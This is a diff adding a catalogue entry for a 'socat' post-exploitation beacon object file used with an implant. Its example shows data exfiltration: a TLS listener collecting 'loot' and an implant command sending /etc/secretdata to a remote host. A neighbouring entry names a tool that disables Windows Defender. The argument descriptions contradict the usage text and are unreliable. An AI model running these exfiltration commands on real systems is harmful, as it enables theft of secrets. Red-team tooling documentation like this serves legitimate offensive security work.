@@ -662,6 +662,46 @@ errors:
   code: 0x8
   message: "Unknown error"
 ---
+name: socat
+description: "Concatenate and redirect sockets"
+author: Z-Labs
+Arch: ["x64", "x86", "aarch64", "arm"]
+tags: ['windows', 'linux','TA0007', 'T1083', 'z-labs']
+category: "POSTEX-BOF"
+OS: cross-platform
+sources:
+    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/socat.zig'
+examples: |
+   socat <src-address> <sink-address>
+
+ <src-address> - an address that acts as data source
+ <sink-address> - an address that acts as data sink
+
+ Currently available address types:
+   OPEN:<filename>
+   CREATE:<filename>
+   TCP:<host:port>
+   TLS:<host:ssl-enabled port>
+
+ Example use case: data exfiltration via TLS channel with z-beac0n:
+
+ Setting up listener with ncat on the server-side:
+   ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
+ OR with socat (original):
+   socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
+
+ In the implant:
+   z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
+arguments:
+- name: src_address
+  desc: "path to a file that will be overwritten"
+  type: string
+  required: true
+- name: sink_address
+  desc: "offset in overwritten file"
+  type: string
+  required: true
+---
 name: KillDefender
 description: "Make Windows Defender useless by removing its token privileges and lowering the token integrity"
 author: Cerbersec
